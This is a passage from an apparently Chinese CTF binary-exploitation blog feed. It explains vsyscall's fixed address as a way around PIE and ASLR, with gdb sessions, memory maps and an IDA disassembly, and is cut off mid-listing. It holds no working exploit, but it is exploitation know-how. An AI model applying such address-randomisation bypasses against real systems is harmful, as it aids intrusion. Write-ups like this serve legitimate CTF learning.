operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> valueStopped reason<span class="token operator">:</span> SIGSEGV<span class="token number">0x0000000000601028</span> in <span class="token function">_GLOBAL_OFFSET_TABLE_</span> <span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这里就直接将got表地址当作ret目标，而不是地址上的值（真正的地址）</p><p>参考资料：<a href="https://adworld.xctf.org.cn/media/uploads/writeup/4b6e244402fe11ea9f5700163e004e93.pdf" target="_blank" rel="noopener">https://adworld.xctf.org.cn/media/uploads/writeup/4b6e244402fe11ea9f5700163e004e93.pdf</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PIE绕过-vsyscall</title>
      <link href="/2020/08/29/pie-rao-guo-vsyscall/"/>
      <url>/2020/08/29/pie-rao-guo-vsyscall/</url>
      
        <content type="html"><![CDATA[<p>前面我学习了一种pie绕过方法，然而那种方法有很大的局限性（没那么简单的题<del>~</del>），今天我又学到了一种方法——-vsyscall</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>使用cat /proc/self/maps指令 来查看当前的函数库，堆栈的地址（我的aslr开启）<br>第一次：</p><pre class=" language-java"><code class="language-java">01f76000<span class="token operator">-</span>01f97000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                                  <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>7f2c892ed000<span class="token operator">-</span>7f2c89780000 r<span class="token operator">--</span>p <span class="token number">00000000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">132431</span>                     <span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>locale<span class="token operator">/</span>locale<span class="token operator">-</span>archive7f2c89780000<span class="token operator">-</span>7f2c89967000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052455</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f2c89967000<span class="token operator">-</span>7f2c89b67000 <span class="token operator">--</span><span class="token operator">-</span>p <span class="token number">001e7000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052455</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f2c89b67000<span class="token operator">-</span>7f2c89b6b000 r<span class="token operator">--</span>p <span class="token number">001e7000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052455</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f2c89b6b000<span class="token operator">-</span>7f2c89b6d000 rw<span class="token operator">-</span>p 001eb000 <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052455</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f2c89b6d000<span class="token operator">-</span>7f2c89b71000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7f2c89b71000<span class="token operator">-</span>7f2c89b98000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052451</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f2c89d5b000<span class="token operator">-</span>7f2c89d7f000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7f2c89d98000<span class="token operator">-</span>7f2c89d99000 r<span class="token operator">--</span>p <span class="token number">00027000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052451</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f2c89d99000<span class="token operator">-</span>7f2c89d9a000 rw<span class="token operator">-</span>p <span class="token number">00028000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052451</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f2c89d9a000<span class="token operator">-</span>7f2c89d9b000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7ffd6e568000<span class="token operator">-</span>7ffd6e589000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                          <span class="token punctuation">[</span>stack<span class="token punctuation">]</span>7ffd6e5bc000<span class="token operator">-</span>7ffd6e5bf000 r<span class="token operator">--</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                          <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>7ffd6e5bf000<span class="token operator">-</span>7ffd6e5c1000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                          <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>ffffffffff600000<span class="token operator">-</span>ffffffffff601000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                  <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span></code></pre><p>再次执行：</p><pre class=" language-java"><code class="language-java">01fd7000<span class="token operator">-</span>01ff8000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                                  <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>7f074db97000<span class="token operator">-</span>7f074e02a000 r<span class="token operator">--</span>p <span class="token number">00000000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">132431</span>                     <span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>locale<span class="token operator">/</span>locale<span class="token operator">-</span>archive7f074e02a000<span class="token operator">-</span>7f074e211000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052455</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f074e211000<span class="token operator">-</span>7f074e411000 <span class="token operator">--</span><span class="token operator">-</span>p <span class="token number">001e7000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052455</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f074e411000<span class="token operator">-</span>7f074e415000 r<span class="token operator">--</span>p <span class="token number">001e7000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052455</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f074e415000<span class="token operator">-</span>7f074e417000 rw<span class="token operator">-</span>p 001eb000 <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052455</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f074e417000<span class="token operator">-</span>7f074e41b000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7f074e41b000<span class="token operator">-</span>7f074e442000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052451</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f074e605000<span class="token operator">-</span>7f074e629000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7f074e642000<span class="token operator">-</span>7f074e643000 r<span class="token operator">--</span>p <span class="token number">00027000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052451</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f074e643000<span class="token operator">-</span>7f074e644000 rw<span class="token operator">-</span>p <span class="token number">00028000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052451</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f074e644000<span class="token operator">-</span>7f074e645000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7fffa112f000<span class="token operator">-</span>7fffa1150000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                          <span class="token punctuation">[</span>stack<span class="token punctuation">]</span>7fffa11b7000<span class="token operator">-</span>7fffa11ba000 r<span class="token operator">--</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                          <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>7fffa11ba000<span class="token operator">-</span>7fffa11bc000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                          <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>ffffffffff600000<span class="token operator">-</span>ffffffffff601000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                  <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span></code></pre><p>可以发现堆区，栈区，以及一些libc库的基地址都发生了变化，只有那个神奇的东西其地址不动如山。他就是———–vsyscall<br>vsyscall的地址一直在ffffffffff600000-ffffffffff601000之间</p><h2 id="vsyscall何许人也"><a href="#vsyscall何许人也" class="headerlink" title="vsyscall何许人也~"></a>vsyscall何许人也~</h2><blockquote><p>简单地说，现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall.</p></blockquote><h3 id="gdb-dump-文件"><a href="#gdb-dump-文件" class="headerlink" title="gdb dump 文件"></a>gdb dump 文件</h3><ul><li><p>先在一个终端运行某个程序</p><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>DASCTF<span class="token operator">/</span>七夕$ <span class="token punctuation">.</span>/magic_number Your Input <span class="token operator">:</span></code></pre></li><li><p>开启一个终端查看进程PID</p><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span>$ ps aux <span class="token operator">|</span> grep magic_numberhunter    <span class="token number">11588</span>  <span class="token number">0.3</span>  <span class="token number">1.4</span> <span class="token number">774976</span> <span class="token number">28600</span> <span class="token operator">?</span>        Sl   <span class="token number">23</span><span class="token operator">:</span><span class="token number">00</span>   <span class="token number">0</span><span class="token operator">:</span><span class="token number">09</span> gedit <span class="token operator">/</span>home<span class="token operator">/</span>hunter<span class="token operator">/</span>PWN<span class="token operator">/</span>DASCTF<span class="token operator">/</span>七夕<span class="token operator">/</span>magic_number<span class="token punctuation">.</span>pyhunter    <span class="token number">13464</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>   <span class="token number">4376</span>   <span class="token number">708</span> pts<span class="token operator">/</span><span class="token number">3</span>    S<span class="token operator">+</span>   <span class="token number">23</span><span class="token operator">:</span><span class="token number">50</span>   <span class="token number">0</span><span class="token operator">:</span><span class="token number">00</span> <span class="token punctuation">.</span>/magic_number   hunter    <span class="token number">13495</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>  <span class="token number">16180</span>  <span class="token number">1092</span> pts<span class="token operator">/</span><span class="token number">18</span>   S<span class="token operator">+</span>   <span class="token number">23</span><span class="token operator">:</span><span class="token number">51</span>   <span class="token number">0</span><span class="token operator">:</span><span class="token number">00</span> grep <span class="token operator">--</span>color<span class="token operator">=</span>auto magic_number是中间那个</code></pre></li><li><p>执行 sudo gdb attach 13464  </p><pre class=" language-java"><code class="language-java">R12<span class="token operator">:</span> <span class="token function">0x555fc4460870</span> <span class="token punctuation">(</span>xor    ebp<span class="token punctuation">,</span>ebp<span class="token punctuation">)</span>R13<span class="token operator">:</span> <span class="token number">0x7ffe99e87760</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1</span> R14<span class="token operator">:</span> <span class="token number">0x0</span> R15<span class="token operator">:</span> <span class="token number">0x0</span>EFLAGS<span class="token operator">:</span> <span class="token function">0x246</span> <span class="token punctuation">(</span>carry PARITY adjust ZERO sign trap INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>code<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span> <span class="token number">0x7fa10243707b</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token operator">:</span>    jne    <span class="token number">0x7fa102437090</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span> <span class="token number">0x7fa10243707d</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">13</span><span class="token operator">></span><span class="token operator">:</span>    xor    eax<span class="token punctuation">,</span>eax <span class="token number">0x7fa10243707f</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">15</span><span class="token operator">></span><span class="token operator">:</span>    syscall <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x7fa102437081</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">17</span><span class="token operator">></span><span class="token operator">:</span>    cmp    rax<span class="token punctuation">,</span><span class="token number">0xfffffffffffff000</span> <span class="token number">0x7fa102437087</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">23</span><span class="token operator">></span><span class="token operator">:</span>    ja     <span class="token number">0x7fa1024370e0</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">112</span><span class="token operator">></span> <span class="token number">0x7fa102437089</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">25</span><span class="token operator">></span><span class="token operator">:</span>    repz ret  <span class="token number">0x7fa10243708b</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">27</span><span class="token operator">></span><span class="token operator">:</span>    nop    DWORD PTR <span class="token punctuation">[</span>rax<span class="token operator">+</span>rax<span class="token operator">*</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">0x0</span><span class="token punctuation">]</span> <span class="token number">0x7fa102437090</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span><span class="token operator">:</span>    push   r12<span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0x7ffe99e87648</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x555fc4460ae0</span> <span class="token punctuation">(</span>mov    eax<span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0x7ffe99e87650</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7fa1027289a0</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>_dl_fini<span class="token operator">></span><span class="token operator">:</span>    push   rbp<span class="token punctuation">)</span><span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0x7ffe99e87658</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0x7ffe99e87660</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x555fc4460af0</span> <span class="token punctuation">(</span>push   r15<span class="token punctuation">)</span><span class="token number">0032</span><span class="token operator">|</span> <span class="token number">0x7ffe99e87668</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x555fc4460870</span> <span class="token punctuation">(</span>xor    ebp<span class="token punctuation">,</span>ebp<span class="token punctuation">)</span><span class="token number">0040</span><span class="token operator">|</span> <span class="token number">0x7ffe99e87670</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x7ffe99e87760</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1</span> <span class="token number">0048</span><span class="token operator">|</span> <span class="token number">0x7ffe99e87678</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xb483671a00000000</span> <span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0x7ffe99e87680</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x555fc4460af0</span> <span class="token punctuation">(</span>push   r15<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token number">0x00007fa102437081</span> in <span class="token function">__GI___libc_read</span> <span class="token punctuation">(</span>fd<span class="token operator">=</span><span class="token number">0x0</span><span class="token punctuation">,</span> buf<span class="token operator">=</span><span class="token number">0x7ffe99e87650</span><span class="token punctuation">,</span> nbytes<span class="token operator">=</span><span class="token number">0x100</span><span class="token punctuation">)</span> at <span class="token punctuation">.</span><span class="token punctuation">.</span>/sysdeps<span class="token operator">/</span>unix<span class="token operator">/</span>sysv<span class="token operator">/</span>linux<span class="token operator">/</span>read<span class="token punctuation">.</span>c<span class="token operator">:</span><span class="token number">27</span><span class="token number">27</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span>/sysdeps<span class="token operator">/</span>unix<span class="token operator">/</span>sysv<span class="token operator">/</span>linux<span class="token operator">/</span>read<span class="token punctuation">.</span>c<span class="token operator">:</span> 没有那个文件或目录<span class="token punctuation">.</span>gdb<span class="token operator">-</span>peda$ </code></pre></li><li><p>dump 地址 ：dump memory 生成的文件名 addr1 addr2  </p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token number">0x00007feca1425081</span> in <span class="token function">__GI___libc_read</span> <span class="token punctuation">(</span>fd<span class="token operator">=</span><span class="token number">0x0</span><span class="token punctuation">,</span> buf<span class="token operator">=</span><span class="token number">0x7ffc39ab82e0</span><span class="token punctuation">,</span> nbytes<span class="token operator">=</span><span class="token number">0x100</span><span class="token punctuation">)</span> at <span class="token punctuation">.</span><span class="token punctuation">.</span>/sysdeps<span class="token operator">/</span>unix<span class="token operator">/</span>sysv<span class="token operator">/</span>linux<span class="token operator">/</span>read<span class="token punctuation">.</span>c<span class="token operator">:</span><span class="token number">27</span><span class="token number">27</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span>/sysdeps<span class="token operator">/</span>unix<span class="token operator">/</span>sysv<span class="token operator">/</span>linux<span class="token operator">/</span>read<span class="token punctuation">.</span>c<span class="token operator">:</span> 没有那个文件或目录<span class="token punctuation">.</span>gdb<span class="token operator">-</span>peda$ dump memory magic_number<span class="token punctuation">.</span>dump <span class="token number">0xffffffffff600000</span> <span class="token number">0xffffffffff601000</span>gdb<span class="token operator">-</span>peda$ 这样就把从<span class="token number">0xffffffffff600000</span>到<span class="token number">0xffffffffff601000</span>地址处的二进制文件dump下来，生成magic_number<span class="token punctuation">.</span>dump文件</code></pre></li></ul><h3 id="IDA查看"><a href="#IDA查看" class="headerlink" title="IDA查看"></a>IDA查看</h3><pre class=" language-java"><code class="language-java">seg000<span class="token operator">:</span><span class="token number">0000000000000000</span> <span class="token punctuation">;</span> Format      <span class="token operator">:</span> 二进制seg000<span class="token operator">:</span><span class="token number">0000000000000000</span> <span class="token punctuation">;</span> Base Address<span class="token operator">:</span> 0000h Range<span class="token operator">:</span> 0000h <span class="token operator">-</span> 1000h Loaded length<span class="token operator">:</span> 1000hseg000<span class="token operator">:</span><span class="token number">0000000000000000</span>seg000<span class="token operator">:</span><span class="token number">0000000000000000</span>                 <span class="token punctuation">.</span>686pseg000<span class="token operator">:</span><span class="token number">0000000000000000</span>                 <span class="token punctuation">.</span>mmxseg000<span class="token operator">:</span><span class="token number">0000000000000000</span>                 <span class="token punctuation">.</span>model flatseg000<span class="token operator">:</span><span class="token number">0000000000000000</span>seg000<span class="token operator">:</span><span class="token number">0000000000000000</span> <span class="token punctuation">;</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>seg000<span class="token operator">:</span><span class="token number">0000000000000000</span>seg000<span class="token operator">:</span><span class="token number">0000000000000000</span> <span class="token punctuation">;</span> Segment type<span class="token operator">:</span> Pure codeseg000<span class="token operator">:</span><span class="token number">0000000000000000</span> seg000          segment <span class="token keyword">byte</span> <span class="token keyword">public</span> <span class="token string">'CODE'</span> use64seg000<span class="token operator">:</span><span class="token number">0000000000000000</span>                 assume cs<span class="token operator">:</span>seg000seg000<span class="token operator">:</span><span class="token number">0000000000000000</span>                 assume es<span class="token operator">:</span>nothing<span class="token punctuation">,</span> ss<span class="token operator">:</span>nothing<span class="token punctuation">,</span> ds<span class="token operator">:</span>nothing<span class="token punctuation">,</span> fs<span class="token operator">:</span>nothing<span class="token punctuation">,</span> gs<span class="token operator">:</span>nothingseg000<span class="token operator">:</span><span class="token number">0000000000000000</span>                 mov     rax<span class="token punctuation">,</span> 60hseg000<span class="token operator">:</span><span class="token number">0000000000000007</span>                 syscall                 <span class="token punctuation">;</span> Low latency system callseg000<span class="token operator">:</span><span class="token number">0000000000000009</span>                 retnseg000<span class="token operator">:</span><span class="token number">0000000000000009</span> <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>seg000<span class="token operator">:</span>000000000000000A                 align 400hseg000<span class="token operator">:</span><span class="token 